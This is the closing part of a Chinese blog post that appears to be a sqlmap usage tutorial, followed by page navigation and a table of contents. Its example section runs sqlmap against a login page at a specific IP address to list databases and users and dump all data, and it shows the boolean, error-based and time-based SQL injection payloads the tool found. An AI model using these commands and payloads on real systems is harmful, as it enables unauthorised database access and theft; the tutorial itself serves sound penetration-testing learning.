Hard</span><br><span class="line">&gt; 1</span><br><span class="line">Enumeration (--banner/--current-user/etc). Please choose:</span><br><span class="line">[1] Basic (default)</span><br><span class="line">[2] Intermediate</span><br><span class="line">[3] All</span><br><span class="line">&gt; 1</span><br><span class="line"></span><br><span class="line">sqlmap is running, please wait..</span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)</span><br><span class="line">    Payload: username=001%&apos; OR NOT 2143=2143#&amp;password=003</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 OR time-based blind (comment)</span><br><span class="line">    Payload: username=001%&apos; OR SLEEP(5)#&amp;password=003</span><br><span class="line">---</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS operating system: Linux Ubuntu</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">banner:    &apos;5.5.50-0ubuntu0.14.04.1&apos;</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">current database:    &apos;DSSchool&apos;</span><br><span class="line">current user is DBA:    True</span><br><span class="line"></span><br><span class="line">[*] shutting down at 20:40:07</span><br></pre></td></tr></table></figure>

<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre><code>sqlmap -u http://34.94.3.143/597f0df394/login --data=&apos;username=&amp;password=&apos; --batch --banner

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=&apos; OR NOT 2556=2556#&amp;password=

    Type: error-based
    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=&apos; AND (SELECT 6513 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(6513=6513,1))),0x71717a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- siMz&amp;password=

    Type: AND/OR time-based blind
    Title: MySQL &gt;= 5.0.12 OR time-based blind
    Payload: username=&apos; OR SLEEP(5)-- efxv&amp;password=
---
[23:22:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL &gt;= 5.0
[23:22:37] [INFO] fetched data logged to text files under &apos;/Users/dog/.sqlmap/output/34.94.3.143&apos;

sqlmap -u http://34.94.3.143/597f0df394/login --data=&apos;username=&amp;password=&apos; --dbs --users

sqlmap -u http://34.94.3.143/597f0df394/login --data=&apos;username=&amp;password=&apos; --batch --dump --random-agent --time-sec=10 --thread=10

sqlmap --purge //清理以前的缓存</code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><blockquote>
<p><a href="https://blog.csdn.net/wn314/article/details/78872828" target="_blank" rel="noopener">原文</a><br><a href="http://sqlmap.org" target="_blank" rel="noopener">sqlmap官网</a><br><a href="https://www.secpulse.com/archives/4213.html" target="_blank" rel="noopener">SqlMap用户手册</a><br><a href="https://www.cnblogs.com/tdcqma/p/5610235.html" target="_blank" rel="noopener">sqlmap批量扫描burpsuite请求日志记录</a><br><a href="https://stackoverflow.com/questions/1324421/how-to-get-past-the-login-page-with-wget" target="_blank" rel="noopener">How to get past the login page with Wget?</a><br><a href="http://www.hackdig.com/?02/hack-18097.htm" target="_blank" rel="noopener">笔记: Data Retrieval over DNS in SQL Injection Attacks</a>  </p>
</blockquote>

    </div>

    
    
    
        
      

      <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
              
                <a href="/2019/08/14/hello-world/" rel="next" title="Hello World">
                  <i class="fa fa-chevron-left"></i> Hello World
                </a>
              
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
              
                <a href="/2019/08/19/macdown/" rel="prev" title="MacDown">
                  MacDown <i class="fa fa-chevron-right"></i>
                </a>
              
            </div>
          </div>
        
      </footer>
    
  </div>
  
  
  
  </article>

  </div>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">fangshengjian</p>
  <div class="site-description motion-element" itemprop="description"></div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">4</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
  </nav>



        </div>
      </div>
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、Sqlmap是什么"><span class="nav-number">1.</span> <span class="nav-text">一、Sqlmap是什么</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、安装Sqlmap"><span class="nav-number">2.</span> <span class="nav-text">二、安装Sqlmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、输出级别-Output-verbosity"><span class="nav-number">3.</span> <span class="nav-text">三、输出级别(Output verbosity)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、指定目标"><span class="nav-number">4.</span> <span class="nav-text">四、指定目标</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-直接连接数据库"><span class="nav-number">4.1.</span> <span class="nav-text">1.直接连接数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-当数据库管理系统是MySQL、Oracle、Microsoft-SQL-Server或PostgreSQL等时格式为："><span class="nav-number">4.1.1.</span> <span class="nav-text">(1).当数据库管理系统是MySQL、Oracle、Microsoft SQL Server或PostgreSQL等时格式为：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-当数据库管理系统是SQLite、Microsoft-Access或Firebird等时格式为："><span class="nav-number">4.1.2.</span> <span class="nav-text">(2).当数据库管理系统是SQLite、Microsoft Access或Firebird等时格式为：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-指定目标URL"><span class="nav-number">4.2.</span> <span class="nav-text">2.指定目标URL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-从Burp或WebScarab的代理日志中解析目标"><span class="nav-number">4.3.</span> <span class="nav-text">3.从Burp或WebScarab的代理日志中解析目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-从站点地图文件中解析目标"><span class="nav-number">4.4.</span> <span class="nav-text">4.从站点地图文件中解析目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-从文本文件中解析目标"><span class="nav-number">4.5.</span> <span class="nav-text">5.从文本文件中解析目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-从文件载入HTTP请求"><span class="nav-number">4.6.</span> <span class="nav-text">6.从文件载入HTTP请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-将Google搜索结果作为攻击目标"><span class="nav-number">4.7.</span> <span class="nav-text">7.将Google搜索结果作为攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-从配置文件中载入攻击目标"><span class="nav-number">4.8.</span> <span class="nav-text">8.从配置文件中载入攻击目标</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、请求"><span class="nav-number">5.</span> <span class="nav-text">五、请求</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-HTTP方法"><span class="nav-number">5.1.</span> <span class="nav-text">1.HTTP方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-POST数据"><span class="nav-number">5.2.</span> <span class="nav-text">2.POST数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-指定分隔符"><span class="nav-number">5.3.</span> <span class="nav-text">3.指定分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-cookie"><span class="nav-number">5.4.</span> <span class="nav-text">4.cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-“–cookie”和“–cookie-del”"><span class="nav-number">5.4.1.</span> <span class="nav-text">(1).“–cookie”和“–cookie-del”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-“–drop-set-cookie”"><span class="nav-number">5.4.2.</span> <span class="nav-text">(2).“–drop-set-cookie”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-“–load-cookies”"><span class="nav-number">5.4.3.</span> <span class="nav-text">(3).“–load-cookies”</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-User-Agent"><span class="nav-number">5.5.</span> <span class="nav-text">5.User-Agent</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Host"><span class="nav-number">5.6.</span> <span class="nav-text">6.Host</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Referer"><span class="nav-number">5.7.</span> <span class="nav-text">7.Referer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-额外的HTTP头"><span class="nav-number">5.8.</span> <span class="nav-text">8.额外的HTTP头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-身份认证"><span class="nav-number">5.9.</span> <span class="nav-text">9.身份认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-基于证书的身份认证"><span class="nav-number">5.10.</span> <span class="nav-text">10.基于证书的身份认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-忽略错误code"><span class="nav-number">5.11.</span> <span class="nav-text">11.忽略错误code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-HTTP-S-代理"><span class="nav-number">5.12.</span> <span class="nav-text">12.HTTP(S)代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-Tor匿名网络"><span class="nav-number">5.13.</span> <span class="nav-text">13.Tor匿名网络</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-HTTP请求之间添加延迟"><span class="nav-number">5.14.</span> <span class="nav-text">14.HTTP请求之间添加延迟</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-超时"><span class="nav-number">5.15.</span> <span class="nav-text">15.超时</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-超时后最大重试次数"><span class="nav-number">5.16.</span> <span class="nav-text">16.超时后最大重试次数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-随机化参数值"><span class="nav-number">5.17.</span> <span class="nav-text">17.随机化参数值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-用正则表达式过滤代理日志"><span class="nav-number">5.18.</span> <span class="nav-text">18.用正则表达式过滤代理日志</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-避免错误请求过多而被屏蔽"><span class="nav-number">5.19.</span> <span class="nav-text">19.避免错误请求过多而被屏蔽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-关闭URL编码"><span class="nav-number">5.20.</span> <span class="nav-text">20.关闭URL编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-绕过CSRF保护"><span class="nav-number">5.21.</span> <span class="nav-text">21.绕过CSRF保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-强制使用SSL"><span class="nav-number">5.22.</span> <span class="nav-text">22.强制使用SSL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-在每次请求前执行特定Python代码"><span class="nav-number">5.23.</span> <span class="nav-text">23.在每次请求前执行特定Python代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、优化"><span class="nav-number">6.</span> <span class="nav-text">六、优化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-一键优化"><span class="nav-number">6.1.</span> <span class="nav-text">1.一键优化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-HTTP长连接"><span class="nav-number">6.2.</span> <span class="nav-text">2.HTTP长连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-HTTP空连接"><span class="nav-number">6.3.</span> <span class="nav-text">3.HTTP空连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-HTTP并发"><span class="nav-number">6.4.</span> <span class="nav-text">4.HTTP并发</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、注入"><span class="nav-number">7.</span> <span class="nav-text">七、注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-要测试的注入点"><span class="nav-number">7.1.</span> <span class="nav-text">1.要测试的注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-指定数据库管理系统"><span class="nav-number">7.2.</span> <span class="nav-text">2.指定数据库管理系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-指定运行数据库管理系统的操作系统"><span class="nav-number">7.3.</span> <span class="nav-text">3.指定运行数据库管理系统的操作系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-生成无效参数值时强制使用大数"><span class="nav-number">7.4.</span> <span class="nav-text">4.生成无效参数值时强制使用大数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-生成无效参数值时强制使用逻辑操作符"><span class="nav-number">7.5.</span> <span class="nav-text">5.生成无效参数值时强制使用逻辑操作符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-生成无效参数值时强制使用字符串"><span class="nav-number">7.6.</span> <span class="nav-text">6.生成无效参数值时强制使用字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-关闭payload转换"><span class="nav-number">7.7.</span> <span class="nav-text">7.关闭payload转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-关闭字符串编码"><span class="nav-number">7.8.</span> <span class="nav-text">8.关闭字符串编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-定制payload"><span class="nav-number">7.9.</span> <span class="nav-text">9.定制payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-修改注入数据"><span class="nav-number">7.10.</span> <span class="nav-text">10.修改注入数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、检测"><span class="nav-number">8.</span> <span class="nav-text">八、检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-检测级别"><span class="nav-number">8.1.</span> <span class="nav-text">1.检测级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-风险等级"><span class="nav-number">8.2.</span> <span class="nav-text">2.风险等级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-页面对比"><span class="nav-number">8.3.</span> <span class="nav-text">3.页面对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#九、注入技术"><span class="nav-number">9.</span> <span class="nav-text">九、注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-检测时所用技术"><span class="nav-number">9.1.</span> <span class="nav-text">1.检测时所用技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-基于时间延迟注入中延时设置"><span class="nav-number">9.2.</span> <span class="nav-text">2.基于时间延迟注入中延时设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-联合查询注入中列数设置"><span class="nav-number">9.3.</span> <span class="nav-text">3.联合查询注入中列数设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-联合查询注入中字符设置"><span class="nav-number">9.4.</span> <span class="nav-text">4.联合查询注入中字符设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-联合查询注入中表名设置"><span class="nav-number">9.5.</span> <span class="nav-text">5.联合查询注入中表名设置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-DNS泄露攻击"><span class="nav-number">9.6.</span> <span class="nav-text">6.DNS泄露攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-二阶注入攻击"><span class="nav-number">9.7.</span> <span class="nav-text">7.二阶注入攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十、指纹"><span class="nav-number">10.</span> <span class="nav-text">十、指纹</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十一、暴力破解"><span class="nav-number">11.</span> <span class="nav-text">十一、暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-暴力破解表名"><span class="nav-number">11.1.</span> <span class="nav-text">1.暴力破解表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-暴力破解列名"><span class="nav-number">11.2.</span> <span class="nav-text">2.暴力破解列名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十二、列举数据"><span class="nav-number">12.</span> <span class="nav-text">十二、列举数据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-一键列举全部数据"><span class="nav-number">12.1.</span> <span class="nav-text">1.一键列举全部数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-列举数据库管理系统信息"><span class="nav-number">12.2.</span> <span class="nav-text">2.列举数据库管理系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-列举当前用户"><span class="nav-number">12.3.</span> <span class="nav-text">3.列举当前用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-列举当前数据库"><span class="nav-number">12.4.</span> <span class="nav-text">4.列举当前数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-列举服务器主机名"><span class="nav-number">12.5.</span> <span class="nav-text">5.列举服务器主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-检测当前用户是否是管理员"><span class="nav-number">12.6.</span> <span class="nav-text">6.检测当前用户是否是管理员</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-列举数据库管理系统中的用户"><span class="nav-number">12.7.</span> <span class="nav-text">7.列举数据库管理系统中的用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-列举并破解数据库管理系统用户密码Hash值"><span class="nav-number">12.8.</span> <span class="nav-text">8.列举并破解数据库管理系统用户密码Hash值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-列举数据库管理系统的用户权限"><span class="nav-number">12.9.</span> <span class="nav-text">9.列举数据库管理系统的用户权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-列举数据库管理系统的用户角色"><span class="nav-number">12.10.</span> <span class="nav-text">10.列举数据库管理系统的用户角色</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-列举数据库管理系统中的所有数据库"><span class="nav-number">12.11.</span> <span class="nav-text">11.列举数据库管理系统中的所有数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-列举数据库数据库的所有表"><span class="nav-number">12.12.</span> <span class="nav-text">12.列举数据库数据库的所有表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-列举数据表的所有列"><span class="nav-number">12.13.</span> <span class="nav-text">13.列举数据表的所有列</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十三、列举数据库管理系统的模式"><span class="nav-number">13.</span> <span class="nav-text">十三、列举数据库管理系统的模式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-列举表中数据条数"><span class="nav-number">13.1.</span> <span class="nav-text">1.列举表中数据条数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-列举表中数据"><span class="nav-number">13.2.</span> <span class="nav-text">2.列举表中数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-列举所有数据库所有表中所有数据"><span class="nav-number">13.3.</span> <span class="nav-text">3.列举所有数据库所有表中所有数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-在数据库、表、列中搜索"><span class="nav-number">13.4.</span> <span class="nav-text">4.在数据库、表、列中搜索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-运行自定义的SQL语句"><span class="nav-number">13.5.</span> <span class="nav-text">5.运行自定义的SQL语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十四、UDF注入"><span class="nav-number">14.</span> <span class="nav-text">十四、UDF注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十五、访问文件系统"><span class="nav-number">15.</span> <span class="nav-text">十五、访问文件系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-读取文件"><span class="nav-number">15.1.</span> <span class="nav-text">1.读取文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-上传文件"><span class="nav-number">15.2.</span> <span class="nav-text">2.上传文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十六、操作系统控制"><span class="nav-number">16.</span> <span class="nav-text">十六、操作系统控制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-执行任意操作系统命令"><span class="nav-number">16.1.</span> <span class="nav-text">1.执行任意操作系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-带外TCP连接：Meterpreter及相关"><span class="nav-number">16.2.</span> <span class="nav-text">2.带外TCP连接：Meterpreter及相关</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十七、Windows注册表操作"><span class="nav-number">17.</span> <span class="nav-text">十七、Windows注册表操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-读Windows注册表键值"><span class="nav-number">17.1.</span> <span class="nav-text">1.读Windows注册表键值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-写Windows注册表键值"><span class="nav-number">17.2.</span> <span class="nav-text">2.写Windows注册表键值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-删除Windows注册表键值"><span class="nav-number">17.3.</span> <span class="nav-text">3.删除Windows注册表键值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-辅助"><span class="nav-number">17.4.</span> <span class="nav-text">4.辅助</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十八、通用选项"><span class="nav-number">18.</span> <span class="nav-text">十八、通用选项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-从SQLite文件中载入Sqlmap会话"><span class="nav-number">18.1.</span> <span class="nav-text">1.从SQLite文件中载入Sqlmap会话</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-将HTTP-S-流量记录到日志文件中"><span class="nav-number">18.2.</span> <span class="nav-text">2.将HTTP(S)流量记录到日志文件中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-非交互模式"><span class="nav-number">18.3.</span> <span class="nav-text">3.非交互模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-设置字符编码"><span class="nav-number">18.4.</span> <span class="nav-text">4.设置字符编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-从目标URL开始爬取目标站点"><span class="nav-number">18.5.</span> <span class="nav-text">5.从目标URL开始爬取目标站点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-设置输出CSV文件中的分隔符"><span class="nav-number">18.6.</span> <span class="nav-text">6.设置输出CSV文件中的分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-数据库管理系统认证凭据"><span class="nav-number">18.7.</span> <span class="nav-text">7.数据库管理系统认证凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-数据输出格式"><span class="nav-number">18.8.</span> <span class="nav-text">8.数据输出格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-估计完成时间"><span class="nav-number">18.9.</span> <span class="nav-text">9.估计完成时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-刷新会话文件"><span class="nav-number">18.10.</span> <span class="nav-text">10.刷新会话文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-解析和测试表单输入字段"><span class="nav-number">18.11.</span> <span class="nav-text">11.解析和测试表单输入字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-忽略会话文件中的查询结果"><span class="nav-number">18.12.</span> <span class="nav-text">12.忽略会话文件中的查询结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-对返回结果使用HEX函数"><span class="nav-number">18.13.</span> <span class="nav-text">13.对返回结果使用HEX函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-指定输出目录路径"><span class="nav-number">18.14.</span> <span class="nav-text">14.指定输出目录路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-从响应中解析DBMS的错误信息"><span class="nav-number">18.15.</span> <span class="nav-text">15.从响应中解析DBMS的错误信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-指定中轴列"><span class="nav-number">18.16.</span> <span class="nav-text">16.指定中轴列</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-保存选项到配置文件中"><span class="nav-number">18.17.</span> <span class="nav-text">17.保存选项到配置文件中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-升级Sqlmap"><span class="nav-number">18.18.</span> <span class="nav-text">18.升级Sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#十九、杂项"><span class="nav-number">19.</span> <span class="nav-text">十九、杂项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-使用简写"><span class="nav-number">19.1.</span> <span class="nav-text">1.使用简写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-在成功检测到注入点时报警"><span class="nav-number">19.2.</span> <span class="nav-text">2.在成功检测到注入点时报警</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-设置问题的回答"><span class="nav-number">19.3.</span> <span class="nav-text">3.设置问题的回答</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-在成功检测到注入点时发出“嘟”声"><span class="nav-number">19.4.</span> <span class="nav-text">4.在成功检测到注入点时发出“嘟”声</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-清除Sqlmap创建的临时表和自定义函数"><span class="nav-number">19.5.</span> <span class="nav-text">5.清除Sqlmap创建的临时表和自定义函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-检查依赖"><span class="nav-number">19.6.</span> <span class="nav-text">6.检查依赖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-关闭彩色输出"><span class="nav-number">19.7.</span> <span class="nav-text">7.关闭彩色输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-指定使用Google-dork结果的某页"><span class="nav-number">19.8.</span> <span class="nav-text">8.指定使用Google dork结果的某页</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-使用HTTP参数污染"><span class="nav-number">19.9.</span> <span class="nav-text">9.使用HTTP参数污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-彻底检测WAF-IPS-IDS"><span class="nav-number">19.10.</span> <span class="nav-text">10.彻底检测WAF/IPS/IDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-模仿智能手机"><span class="nav-number">19.11.</span> <span class="nav-text">11.模仿智能手机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-离线模式（仅仅使用会话数据）"><span class="nav-number">19.12.</span> <span class="nav-text">12.离线模式（仅仅使用会话数据）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-在Google-dork中展示页面权重"><span class="nav-number">19.13.</span> <span class="nav-text">13.在Google dork中展示页面权重</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-从输出目录中安全移除所有内容"><span class="nav-number">19.14.</span> <span class="nav-text">14.从输出目录中安全移除所有内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-快速扫描"><span class="nav-number">19.15.</span> <span class="nav-text">15.快速扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-通过关键词使用或跳过payload"><span class="nav-number">19.16.</span> <span class="nav-text">16.通过关键词使用或跳过payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-交互式Sqlmap-Shell"><span class="nav-number">19.17.</span> <span class="nav-text">17.交互式Sqlmap Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-为初学者准备的简单向导"><span class="nav-number">19.18.</span> <span class="nav-text">18.为初学者准备的简单向导</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例子"><span class="nav-number">20.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文献"><span class="nav-number">21.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
